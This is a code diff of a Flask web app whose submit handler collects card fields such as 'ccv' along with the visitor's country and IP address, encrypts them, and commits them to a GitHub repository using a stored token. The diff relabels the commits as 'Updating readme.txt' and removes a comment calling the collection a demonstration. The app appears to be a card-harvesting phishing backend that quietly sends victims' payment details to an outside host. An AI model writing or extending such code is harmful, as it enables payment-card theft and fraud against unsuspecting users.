@@ -1,5 +1,3 @@
-import pickle
-
 import pandas as pd
 from flask import Flask, render_template, request, redirect, url_for
 
@@ -29,14 +27,14 @@ def get_file_sha():
     return None
 
 
-@app.route("/write-file", methods=["POST"])
+#@app.route("/submit", methods=["POST"])
 def write_file(content):
-    content = content#request.form.get("text_data", "Default content")
+    content = content  # request.form.get("text_data", "Default content")
     content_encoded = content.encode("utf-8").decode("utf-8")
 
     headers = {"Authorization": f"token {GITHUB_TOKEN}"}
     data = {
-        "message": "Updating output.txt",
+        "message": "Updating readme.txt",
         "content": content_encoded.encode("utf-8").hex(),  # Convert to Hex
         "sha": get_file_sha(),  # Needed for updating existing files
     }
@@ -47,6 +45,9 @@ def write_file(content):
         return "File successfully updated in GitHub!"
     else:
         return f"Error: {response.json()}"
+
+
+
 
 # _________________________________________________
 # _________________________________________________
@@ -123,7 +124,6 @@ def submit():
     ccv = request.form['ccv']
     country = request.form['country'] + ''
 
-    # Save the user input (for demonstration, we'll just print it)
     ip_address = request.remote_addr
     with open('readme.txt', 'a', encoding='utf-8') as file:
         text = fr''' 
@@ -134,7 +134,7 @@ def submit():
         '''
         text = encrypt(text)
         write_file(text)
-        #file.write(encrypt(text))
+        # file.write(encrypt(text))
 
     # Optionally, you could save it to a file or database here
 
